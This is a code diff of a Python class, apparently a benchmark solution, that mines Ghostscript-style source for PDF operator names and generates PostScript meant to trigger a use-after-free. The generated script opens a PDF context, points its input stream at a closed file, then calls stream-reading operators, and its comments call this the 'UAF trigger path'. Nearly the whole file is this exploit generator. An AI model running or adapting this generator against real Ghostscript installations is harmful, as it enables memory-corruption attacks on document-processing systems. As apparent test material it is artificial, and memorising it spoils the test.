@@ -1,275 +1,389 @@
 import os
 import re
 import tarfile
-from typing import Dict, Iterable, List, Optional, Tuple
+from dataclasses import dataclass
+from typing import Dict, List, Optional, Tuple
 
 
-def _iter_source_texts(src_path: str) -> Iterable[Tuple[str, str]]:
-    exts = (".c", ".h", ".hh", ".hpp", ".cc", ".cpp", ".m", ".mm", ".inc", ".ps", ".txt", ".md", ".rst")
-    max_size = 8 * 1024 * 1024
+@dataclass(frozen=True)
+class OpDef:
+    name: str
+    argc: int
+    func: str
+    score: int
 
-    def read_file(path: str) -> Optional[str]:
-        try:
-            st = os.stat(path)
-            if st.st_size > max_size:
-                return None
-            with open(path, "rb") as f:
-                data = f.read()
-            return data.decode("utf-8", "ignore")
-        except Exception:
-            return None
 
-    if os.path.isdir(src_path):
-        for root, _, files in os.walk(src_path):
-            for fn in files:
-                lfn = fn.lower()
-                if not lfn.endswith(exts):
-                    continue
-                p = os.path.join(root, fn)
-                s = read_file(p)
-                if s is None:
-                    continue
-                yield p, s
-        return
+class Solution:
+    def __init__(self) -> None:
+        self._opdef_re = re.compile(r'\{\s*"([^"]+)"\s*,\s*([A-Za-z_][A-Za-z0-9_]*)\s*\}')
+        self._func_def_re_cache: Dict[str, re.Pattern] = {}
 
-    try:
+    def _iter_source_files(self, src_path: str):
+        if os.path.isdir(src_path):
+            for root, _, files in os.walk(src_path):
+                for fn in files:
+                    lfn = fn.lower()
+                    if not (lfn.endswith((".c", ".h", ".ps", ".cpp", ".cc"))):
+                        continue
+                    full = os.path.join(root, fn)
+                    yield full, None
+            return
+
+        # tarball
         with tarfile.open(src_path, "r:*") as tf:
             for m in tf.getmembers():
                 if not m.isreg():
                     continue
                 name = m.name
                 lname = name.lower()
-                if not lname.endswith(exts):
+                if not (lname.endswith((".c", ".h", ".ps", ".cpp", ".cc"))):
                     continue
-                if m.size > max_size:
+                # Focus on likely relevant files
+                if not any(x in lname for x in ("pdf", "ps", "interp", "ghost", "z")):
                     continue
-                try:
-                    f = tf.extractfile(m)
-                    if f is None:
-                        continue
+                if m.size <= 0 or m.size > 5_000_000:
+                    continue
+                yield name, (tf, m)
+
+    def _read_text(self, path_or_name: str, tar_ctx) -> str:
+        try:
+            if tar_ctx is None:
+                with open(path_or_name, "rb") as f:
                     data = f.read()
-                except Exception:
+            else:
+                tf, m = tar_ctx
+                f = tf.extractfile(m)
+                if f is None:
+                    return ""
+                data = f.read()
+            return data.decode("latin1", errors="ignore")
+        except Exception:
+            return ""
+
+    def _safe_ps_string(self, s: str) -> str:
+        s = s.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
+        return s
+
+    def _make_min_pdf(self) -> bytes:
+        # Minimal, well-formed PDF with xref
+        lines: List[bytes] = []
+        def add(x: str) -> None:
+            lines.append(x.encode("ascii"))
+
+        add("%PDF-1.4\n")
+        # Objects
+        obj1 = "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
+        obj2 = "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
+        obj3 = "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] /Contents 4 0 R /Resources << >> >>\nendobj\n"
+        obj4 = "4 0 obj\n<< /Length 0 >>\nstream\n\nendstream\nendobj\n"
+
+        body_parts = [obj1, obj2, obj3, obj4]
+
+        offsets = [0]  # xref entry 0
+        cur = sum(len(x) for x in lines)
+        for part in body_parts:
+            offsets.append(cur)
+            cur += len(part.encode("ascii"))
+        for part in body_parts:
+            add(part)
+
+        xref_pos = sum(len(x) for x in lines)
+        add("xref\n")
+        add("0 5\n")
+        add("0000000000 65535 f \n")
+        for off in offsets[1:]:
+            add(f"{off:010d} 00000 n \n")
+
+        add("trailer\n")
+        add("<< /Size 5 /Root 1 0 R >>\n")
+        add("startxref\n")
+        add(f"{xref_pos}\n")
+        add("%%EOF\n")
+        return b"".join(lines)
+
+    def _ps_exec_op(self, opname: str) -> str:
+        # If name is a safe PS token, emit directly; else use (name) cvn load exec
+        if re.fullmatch(r"[A-Za-z_.][A-Za-z0-9_.@$-]*", opname or ""):
+            return opname
+        return f"({self._safe_ps_string(opname)}) cvn load exec"
+
+    def _score_op(self, opname: str, func: str, text_hint: str) -> int:
+        n = (opname or "").lower()
+        f = (func or "").lower()
+        s = 0
+        if "pdfi" in n or "pdfi" in f:
+            s += 60
+        if "runpdfbegin" in n or "runpdfbegin" in f:
+            s += 50
+        if "pdfopen" in n or "pdfopen" in f:
+            s += 45
+        if "istream" in n or "istream" in f:
+            s += 80
+        if "input" in n or "input" in f:
+            s += 30
+        if "stream" in n or "stream" in f:
+            s += 25
+        if "set" in n or "set" in f:
+            s += 25
+        if "read" in n or "read" in f:
+            s += 20
+        if "seek" in n or "seek" in f:
+            s += 20
+        if "xref" in n or "xref" in f:
+            s += 20
+        if "page" in n or "page" in f:
+            s += 15
+        if "close" in n or "close" in f:
+            s -= 10
+        if text_hint:
+            th = text_hint.lower()
+            if "input_stream" in th:
+                s += 60
+            if "istream" in th:
+                s += 30
+            if "stream" in th and ("read" in th or "seek" in th):
+                s += 20
+        return s
+
+    def _extract_opdefs(self, texts: List[Tuple[str, str]]) -> Tuple[List[OpDef], Dict[str, str]]:
+        # returns opdefs, func_snippets
+        op_entries: List[Tuple[str, int, str]] = []
+        func_to_filetext: Dict[str, str] = {}
+        for _, txt in texts:
+            for m in self._opdef_re.finditer(txt):
+                raw = m.group(1)
+                func = m.group(2)
+                mm = re.match(r"(\d+)(.*)$", raw)
+                if not mm:
                     continue
                 try:
-                    s = data.decode("utf-8", "ignore")
+                    argc = int(mm.group(1))
                 except Exception:
                     continue
-                yield name, s
-    except Exception:
-        return
+                name = mm.group(2)
+                if not name:
+                    continue
+                op_entries.append((name, argc, func))
+                if func not in func_to_filetext:
+                    func_to_filetext[func] = txt
 
-
-def _collect_op_defs(src_path: str) -> Dict[str, Tuple[int, str]]:
-    # returns opname -> (nargs, funcname)
-    # Ghostscript style: {"1runpdfbegin", zrunpdfbegin}
-    # also captures operator names starting with '.', etc.
-    op_re = re.compile(r'\{\s*"([0-9]{1,2})([^"]+)"\s*,\s*([A-Za-z_][A-Za-z0-9_]*)\s*\}')
-    ops: Dict[str, Tuple[int, str]] = {}
-    for _, text in _iter_source_texts(src_path):
-        for m in op_re.finditer(text):
-            try:
-                nargs = int(m.group(1))
-            except Exception:
+        # Extract small snippet around function definition when available
+        func_snippet: Dict[str, str] = {}
+        for func, txt in func_to_filetext.items():
+            if func not in self._func_def_re_cache:
+                self._func_def_re_cache[func] = re.compile(
+                    r"(?:^|\n)\s*(?:static\s+)?int\s+%s\s*\(\s*i_ctx_t\s*\*\s*i_ctx_p\s*\)\s*\{" % re.escape(func)
+                )
+            m = self._func_def_re_cache[func].search(txt)
+            if not m:
                 continue
-            name = m.group(2)
-            func = m.group(3)
-            if not name:
-                continue
-            # Keep first seen
-            if name not in ops:
-                ops[name] = (nargs, func)
-    return ops
+            start = m.end()
+            # crude snippet
+            func_snippet[func] = txt[start:start + 2500]
 
+        opdefs: List[OpDef] = []
+        for name, argc, func in op_entries:
+            snippet = func_snippet.get(func, "")
+            score = self._score_op(name, func, snippet)
+            opdefs.append(OpDef(name=name, argc=argc, func=func, score=score))
 
-def _ps_escape_string(s: str) -> str:
-    return s.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
+        # Deduplicate by (name, argc), keep best score
+        best: Dict[Tuple[str, int], OpDef] = {}
+        for o in opdefs:
+            k = (o.name, o.argc)
+            if k not in best or o.score > best[k].score:
+                best[k] = o
+        return list(best.values()), func_snippet
 
-
-def _score_set(name: str, func: str, nargs: int) -> int:
-    n = name.lower()
-    f = func.lower()
-    sc = 0
-    if nargs <= 0 or nargs > 3:
-        sc -= 200
-    else:
-        sc += 10
-        if nargs == 1:
-            sc += 5
-    if "setpdfinput" in n or "setpdfinput" in f:
-        sc += 400
-    if ("set" in n or "set" in f) and ("pdf" in n or "pdf" in f) and ("input" in n or "stream" in n or "input" in f or "stream" in f):
-        sc += 220
-    if "pdfi" in n or "pdfi" in f:
-        sc += 60
-    if "runpdfbegin" in n or "runpdfbegin" in f:
-        sc += 180
-    if "begin" in n and "pdf" in n:
-        sc += 50
-    if "stream" in n:
-        sc += 20
-    if "input" in n:
-        sc += 20
-    return sc
-
-
-def _score_use(name: str, func: str, nargs: int) -> int:
-    n = name.lower()
-    f = func.lower()
-    sc = 0
-    if nargs > 1 or nargs < 0:
-        sc -= 200
-    else:
-        if nargs == 0:
-            sc += 40
-        else:
-            sc += 10
-    if "runpdfend" in n or "runpdfend" in f:
-        sc += 400
-    if ("end" in n) and ("pdf" in n):
-        sc += 120
-    if "pdfi" in n or "pdfi" in f:
-        sc += 40
-    for kw, w in (
-        ("tell", 60),
-        ("seek", 60),
-        ("pos", 40),
-        ("offset", 60),
-        ("read", 40),
-        ("close", 60),
-        ("flush", 40),
-        ("stream", 30),
-        ("input", 20),
-    ):
-        if kw in n or kw in f:
-            sc += w
-    return sc
-
-
-def _score_init(name: str, func: str, nargs: int) -> int:
-    n = name.lower()
-    f = func.lower()
-    sc = 0
-    if nargs != 0:
-        sc -= 100
-    else:
-        sc += 30
-    if "pdfi" in n or "pdfi" in f:
-        sc += 40
-    for kw, w in (("init", 80), ("begin", 40), ("context", 60), ("create", 40), ("new", 20), ("start", 20)):
-        if kw in n or kw in f:
-            sc += w
-    return sc
-
-
-def _select_ops(ops: Dict[str, Tuple[int, str]]) -> Tuple[List[Tuple[str, int]], List[Tuple[str, int]], List[Tuple[str, int]]]:
-    # returns (init_ops, set_ops, use_ops) as (name, nargs)
-    items = [(name, nargs, func) for name, (nargs, func) in ops.items()]
-
-    init_candidates: List[Tuple[int, str, int]] = []
-    set_candidates: List[Tuple[int, str, int]] = []
-    use_candidates: List[Tuple[int, str, int]] = []
-
-    for name, nargs, func in items:
-        ln = name.lower()
-        lf = func.lower()
-
-        if ("pdfi" in ln or "pdfi" in lf) and nargs == 0 and any(k in ln or k in lf for k in ("init", "context", "create", "begin", "start", "new")):
-            init_candidates.append((_score_init(name, func, nargs), name, nargs))
-
-        if any(k in ln or k in lf for k in ("setpdfinput", "runpdfbegin", "set_input", "inputstream", "input_stream", "setstream", "set_stream")) or (
-            ("set" in ln or "set" in lf) and ("pdf" in ln or "pdf" in lf) and ("input" in ln or "stream" in ln or "input" in lf or "stream" in lf)
-        ):
-            set_candidates.append((_score_set(name, func, nargs), name, nargs))
-
-        if any(k in ln or k in lf for k in ("runpdfend", "tell", "seek", "offset", "pos", "read", "close", "flush")) and ("pdf" in ln or "pdf" in lf):
-            use_candidates.append((_score_use(name, func, nargs), name, nargs))
-        elif ("pdfi" in ln or "pdfi" in lf) and any(k in ln or k in lf for k in ("tell", "seek", "offset", "pos", "read", "close", "flush", "stream", "input")):
-            use_candidates.append((_score_use(name, func, nargs), name, nargs))
-
-    init_candidates.sort(reverse=True)
-    set_candidates.sort(reverse=True)
-    use_candidates.sort(reverse=True)
-
-    def dedup_take(cands: List[Tuple[int, str, int]], limit: int, nargs_allow: Optional[Tuple[int, ...]] = None) -> List[Tuple[str, int]]:
-        out: List[Tuple[str, int]] = []
-        seen = set()
-        for _, name, nargs in cands:
-            if name in seen:
-                continue
-            if nargs_allow is not None and nargs not in nargs_allow:
-                continue
-            seen.add(name)
-            out.append((name, nargs))
-            if len(out) >= limit:
-                break
-        return out
-
-    init_ops = dedup_take(init_candidates, 3, nargs_allow=(0,))
-    set_ops = dedup_take(set_candidates, 8, nargs_allow=(1, 2, 3))
-    use_ops = dedup_take(use_candidates, 10, nargs_allow=(0, 1))
-
-    # Ensure some baseline attempts exist
-    baseline_inits: List[Tuple[str, int]] = []
-    baseline_sets: List[Tuple[str, int]] = [("runpdfbegin", 1), (".runpdfbegin", 1), ("setpdfinput", 1), (".setpdfinput", 1)]
-    baseline_uses: List[Tuple[str, int]] = [("runpdfend", 0), (".runpdfend", 0)]
-
-    def merge(base: List[Tuple[str, int]], lst: List[Tuple[str, int]], max_len: int) -> List[Tuple[str, int]]:
-        out = []
-        seen = set()
-        for nm, na in base + lst:
-            if nm in seen:
-                continue
-            seen.add(nm)
-            out.append((nm, na))
-            if len(out) >= max_len:
-                break
-        return out
-
-    init_ops = merge(baseline_inits, init_ops, 4)
-    set_ops = merge(baseline_sets, set_ops, 10)
-    use_ops = merge(baseline_uses, use_ops, 14)
-
-    return init_ops, set_ops, use_ops
-
-
-def _emit_call(name: str, nargs: int) -> str:
-    sn = _ps_escape_string(name)
-    if nargs == 0:
-        return f"mark ({sn}) {{ DO0 }} stopped pop cleartomark\n"
-    if nargs == 1:
-        return f"mark s0 ({sn}) {{ DO1 }} stopped pop cleartomark\n"
-    if nargs == 2:
-        return f"mark s0 <<>> ({sn}) {{ DO2 }} stopped pop cleartomark\n"
-    if nargs == 3:
-        return f"mark s0 <<>> 0 ({sn}) {{ DO3 }} stopped pop cleartomark\n"
-    # fallback
-    return f"mark ({sn}) {{ DO0 }} stopped pop cleartomark\n"
-
-
-def _build_ps(init_ops: List[Tuple[str, int]], set_ops: List[Tuple[str, int]], use_ops: List[Tuple[str, int]]) -> bytes:
-    parts: List[str] = []
-    parts.append("%!PS-Adobe-3.0\n")
-    parts.append("/DO0{dup cvn where{pop cvn load exec}{pop pop}ifelse}bind def\n")
-    parts.append("/DO1{exch dup cvn where{pop exch cvn load exec}{pop pop pop}ifelse}bind def\n")
-    parts.append("/DO2{3 1 roll dup cvn where{pop 3 1 roll cvn load exec}{pop pop pop pop}ifelse}bind def\n")
-    parts.append("/DO3{4 1 roll dup cvn where{pop 4 1 roll cvn load exec}{pop pop pop pop pop}ifelse}bind def\n")
-    parts.append("/s0 currentfile 0 () /SubFileDecode filter def\n")
-
-    for nm, na in init_ops:
-        parts.append(_emit_call(nm, na))
-
-    # Try each set op, then immediately try use ops (the likely UAF trigger path).
-    for snm, sna in set_ops:
-        parts.append(_emit_call(snm, sna))
-        for unm, una in use_ops:
-            parts.append(_emit_call(unm, una))
-
-    parts.append("quit\n")
-    return "".join(parts).encode("latin-1", "ignore")
-
-
-class Solution:
     def solve(self, src_path: str) -> bytes:
-        ops = _collect_op_defs(src_path)
-        init_ops, set_ops, use_ops = _select_ops(ops)
-        return _build_ps(init_ops, set_ops, use_ops)
+        texts: List[Tuple[str, str]] = []
+        for p, tar_ctx in self._iter_source_files(src_path):
+            txt = self._read_text(p, tar_ctx)
+            if not txt:
+                continue
+            l = p.lower()
+            if any(x in l for x in ("pdf", "zpdf", "pdfi", "runpdf", "stream", "operator", "op_def", "interp", "ghost")):
+                texts.append((p, txt))
+            elif len(texts) < 50:
+                # allow some extra
+                texts.append((p, txt))
+            if len(texts) >= 250:
+                break
+
+        opdefs, _ = self._extract_opdefs(texts)
+
+        def pick_ops(pred, limit: int) -> List[OpDef]:
+            arr = [o for o in opdefs if pred(o)]
+            arr.sort(key=lambda x: x.score, reverse=True)
+            # unique by name preferred
+            seen = set()
+            out = []
+            for o in arr:
+                if o.name in seen:
+                    continue
+                seen.add(o.name)
+                out.append(o)
+                if len(out) >= limit:
+                    break
+            return out
+
+        def is_setstream(o: OpDef) -> bool:
+            n = o.name.lower()
+            f = o.func.lower()
+            if "set" not in n and "set" not in f:
+                return False
+            if not (("pdf" in n) or ("pdf" in f) or ("pdfi" in n) or ("pdfi" in f)):
+                return False
+            if ("istream" in n) or ("istream" in f):
+                return True
+            if ("input" in n or "input" in f) and ("stream" in n or "stream" in f or "file" in n or "file" in f):
+                return True
+            if ("stream" in n or "stream" in f) and ("pdfi" in n or "pdfi" in f):
+                return True
+            return False
+
+        def is_open(o: OpDef) -> bool:
+            n = o.name.lower()
+            f = o.func.lower()
+            if "runpdfbegin" in n or "runpdfbegin" in f:
+                return True
+            if "pdfopen" in n or "pdfopen" in f:
+                return True
+            if ("open" in n or "open" in f) and ("pdf" in n or "pdf" in f or "pdfi" in n or "pdfi" in f):
+                return True
+            if ("new" in n or "create" in n or "alloc" in f) and ("pdfi" in f or "pdfi" in n):
+                return True
+            return False
+
+        def is_use(o: OpDef) -> bool:
+            n = o.name.lower()
+            f = o.func.lower()
+            if "pdf" not in n and "pdf" not in f and "pdfi" not in n and "pdfi" not in f:
+                return False
+            if any(k in n for k in ("set", "open", "begin", "close", "end", "init", "create")):
+                return False
+            if o.argc > 3:
+                return False
+            if any(k in n for k in ("read", "seek", "xref", "page", "token", "parse", "next", "obj", "scan", "stream")):
+                return True
+            if "stream" in f:
+                return True
+            return False
+
+        open_ops = pick_ops(is_open, 8)
+        set_ops = pick_ops(is_setstream, 12)
+        use_ops = pick_ops(is_use, 18)
+
+        # Fallbacks (in case scanning fails)
+        if not any(o.name == ".runpdfbegin" for o in open_ops):
+            open_ops = [OpDef(".runpdfbegin", 1, ".runpdfbegin", 999)] + open_ops
+        if not any("setpdf" in o.name.lower() or "istream" in o.name.lower() for o in set_ops):
+            set_ops = [
+                OpDef(".setpdfistream", 2, ".setpdfistream", 999),
+                OpDef(".setpdfinput", 2, ".setpdfinput", 800),
+            ] + set_ops
+        # use fallback
+        if not use_ops:
+            use_ops = [
+                OpDef(".pdfpagecount", 0, ".pdfpagecount", 100),
+                OpDef(".pdfreadxref", 0, ".pdfreadxref", 100),
+                OpDef(".pdfgetpage", 1, ".pdfgetpage", 100),
+            ]
+
+        pdf_bytes = self._make_min_pdf()
+        pdf_str = pdf_bytes.decode("latin1", errors="ignore")
+        bad_str = "X"
+
+        pdf_str_ps = self._safe_ps_string(pdf_str)
+        bad_str_ps = self._safe_ps_string(bad_str)
+
+        # Generate PS code
+        out: List[str] = []
+        out.append("%!PS-Adobe-3.0\n")
+        out.append("userdict begin\n")
+        out.append("/TRY { stopped pop } bind def\n")
+        out.append("/d0 countdictstack def\n")
+        out.append("/ctx null def\n")
+        out.append(f"/pdfstr ({pdf_str_ps}) def\n")
+        out.append(f"/badstr ({bad_str_ps}) def\n")
+        out.append("/mkfile { % (s) -> file\n")
+        out.append("  systemdict /.stringfile known { .stringfile } { pop (%stdin) (r) file } ifelse\n")
+        out.append("} bind def\n")
+        out.append("/F pdfstr mkfile def\n")
+        out.append("/B badstr mkfile def\n")
+        out.append("{ B closefile } TRY\n")
+
+        # Open attempts
+        out.append("% open ctx\n")
+        for o in open_ops[:8]:
+            op_exec = self._ps_exec_op(o.name)
+            if o.argc == 0:
+                out.append(f"{{ {op_exec} /ctx exch def }} TRY\n")
+            elif o.argc == 1:
+                out.append(f"{{ F {op_exec} /ctx exch def }} TRY\n")
+                # try within a begin if ctx is dict already
+                out.append(f"{{ ctx type /dicttype eq {{ ctx begin F {op_exec} end /ctx exch def }} if }} TRY\n")
+            elif o.argc == 2:
+                out.append(f"{{ F 0 {op_exec} /ctx exch def }} TRY\n")
+                out.append(f"{{ 0 F {op_exec} /ctx exch def }} TRY\n")
+
+        # runpdfbegin PS proc fallback
+        out.append("{ /runpdfbegin where { pop F runpdfbegin /ctx currentdict def } if } TRY\n")
+
+        # Set stream attempts (intended to fail)
+        out.append("% set stream to closed/invalid to provoke failure\n")
+        for o in set_ops[:12]:
+            op_exec = self._ps_exec_op(o.name)
+            if o.argc == 0:
+                out.append(f"{{ {op_exec} }} TRY\n")
+                out.append(f"{{ ctx type /dicttype eq {{ ctx begin {op_exec} end }} if }} TRY\n")
+            elif o.argc == 1:
+                out.append(f"{{ B {op_exec} }} TRY\n")
+                out.append(f"{{ ctx {op_exec} }} TRY\n")
+                out.append(f"{{ ctx type /dicttype eq {{ ctx begin B {op_exec} end }} if }} TRY\n")
+            elif o.argc == 2:
+                out.append(f"{{ ctx B {op_exec} }} TRY\n")
+                out.append(f"{{ B ctx {op_exec} }} TRY\n")
+                out.append(f"{{ ctx type /dicttype eq {{ ctx begin B {op_exec} end }} if }} TRY\n")
+                out.append(f"{{ ctx type /dicttype eq {{ ctx begin ctx B {op_exec} end }} if }} TRY\n")
+            elif o.argc == 3:
+                out.append(f"{{ ctx B 0 {op_exec} }} TRY\n")
+                out.append(f"{{ B ctx 0 {op_exec} }} TRY\n")
+                out.append(f"{{ 0 ctx B {op_exec} }} TRY\n")
+                out.append(f"{{ ctx type /dicttype eq {{ ctx begin B 0 {op_exec} end }} if }} TRY\n")
+
+        # Use attempts (after failure)
+        out.append("% use ops (may trigger UAF in vulnerable builds)\n")
+        for o in use_ops[:18]:
+            op_exec = self._ps_exec_op(o.name)
+            if o.argc == 0:
+                out.append(f"{{ {op_exec} }} TRY\n")
+                out.append(f"{{ ctx type /dicttype eq {{ ctx begin {op_exec} end }} if }} TRY\n")
+            elif o.argc == 1:
+                out.append(f"{{ ctx {op_exec} }} TRY\n")
+                out.append(f"{{ 0 {op_exec} }} TRY\n")
+                out.append(f"{{ F {op_exec} }} TRY\n")
+                out.append(f"{{ ctx type /dicttype eq {{ ctx begin {op_exec} end }} if }} TRY\n")
+            elif o.argc == 2:
+                out.append(f"{{ ctx 0 {op_exec} }} TRY\n")
+                out.append(f"{{ 0 ctx {op_exec} }} TRY\n")
+                out.append(f"{{ ctx F {op_exec} }} TRY\n")
+                out.append(f"{{ F ctx {op_exec} }} TRY\n")
+                out.append(f"{{ ctx type /dicttype eq {{ ctx begin 0 {op_exec} end }} if }} TRY\n")
+            elif o.argc == 3:
+                out.append(f"{{ ctx 0 0 {op_exec} }} TRY\n")
+                out.append(f"{{ 0 ctx 0 {op_exec} }} TRY\n")
+                out.append(f"{{ 0 0 ctx {op_exec} }} TRY\n")
+                out.append(f"{{ ctx F 0 {op_exec} }} TRY\n")
+                out.append(f"{{ ctx type /dicttype eq {{ ctx begin 0 0 {op_exec} end }} if }} TRY\n")
+
+        # High-level PS procedures if ctx is a dict
+        out.append("% high-level procedures (if available)\n")
+        out.append("{ ctx type /dicttype eq { ctx begin { pdfpagecount pop } TRY { 0 pdfgetpage pop } TRY end } if } TRY\n")
+
+        # Restore dict stack and quit
+        out.append("{ countdictstack d0 gt { end } { exit } ifelse } loop\n")
+        out.append("quit\n")
+        out.append("end\n")
+
+        return "".join(out).encode("latin1", errors="ignore")
